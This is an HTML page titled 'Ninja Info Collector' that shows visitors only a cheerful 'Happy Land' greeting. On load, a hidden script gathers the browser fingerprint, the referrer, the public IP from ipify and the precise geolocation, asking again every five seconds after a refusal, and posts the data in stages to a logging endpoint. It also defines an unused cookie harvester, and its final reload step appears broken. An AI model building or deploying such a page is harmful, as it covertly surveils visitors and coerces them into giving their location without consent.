<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ninja Info Collector</title>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Collect user agent
            var userAgent = navigator.userAgent;

            // Function to fetch IP address
            function getIPAddress() {
                return fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => data.ip)
                    .catch(error => {
                        console.error('Error fetching IP:', error);
                        return 'Error fetching IP';
                    });
            }

            // Function to fetch Geolocation
            function getGeolocation(resolveFunc) {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        position => resolveFunc({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        }),
                        error => {
                            console.error('Error fetching geolocation:', error);
                            setTimeout(() => getGeolocation(resolveFunc), 5000); // Retry every 5 seconds
                        }
                    );
                } else {
                    console.error('Geolocation not supported');
                    resolveFunc({
                        latitude: 'Geolocation not supported',
                        longitude: 'Geolocation not supported'
                    });
                }
            }

            // Function to get cookies
            function getCookies() {
                try {
                    var cookies = document.cookie.split(';').reduce((cookieObject, cookieString) => {
                        var parts = cookieString.split('=');
                        cookieObject[parts[0].trim()] = parts[1] ? parts[1].trim() : '';
                        return cookieObject;
                    }, {});
                    return cookies;
                } catch (error) {
                    console.error('Error fetching cookies:', error);
                    return 'Error fetching cookies';
                }
            }

            // Function to get referrer
            function getReferrer() {
                return document.referrer || "No referrer";
            }

            // Function to get page load time
            function getPageLoadTime() {
                return window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart;
            }

            // Function to get screen resolution
            function getScreenResolution() {
                return `${screen.width}x${screen.height}`;
            }

            // Function to get local time
            function getLocalTime() {
                return new Date().toLocaleString();
            }

            // Send collected data to the server
            function sendDataToServer(data, callback) {
                fetch('http://localhost:5000/logs', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Success:', result);
                    if (callback) callback();
                })
                .catch(error => {
                    console.error('Error:', error);
                    if (callback) callback();
                });
            }

            // Function to collect and send data in stages
            function collectAndSendData() {
                const data = {
                    userAgent: userAgent,
                    referrer: getReferrer(),
                    pageLoadTime: getPageLoadTime(),
                    screenResolution: getScreenResolution(),
                    localTime: getLocalTime()
                };

                sendDataToServer(data, () => {
                    getIPAddress().then(ipAddress => {
                        sendDataToServer({ ipAddress: ipAddress }, () => {
                            new Promise((resolve) => getGeolocation(resolve)).then(location => {
                                sendDataToServer(location, () => {
                                    setTimeout(() => location.reload(), 5000);
                                });
                            });
                        });
                    });
                });
            }

            // Start the process
            collectAndSendData();
        });
    </script>
</head>
<body>
    <h1>Welcome To Happy Land</h1>
    <p>Your visit is being Very Happy!</p>
</body>
</html>
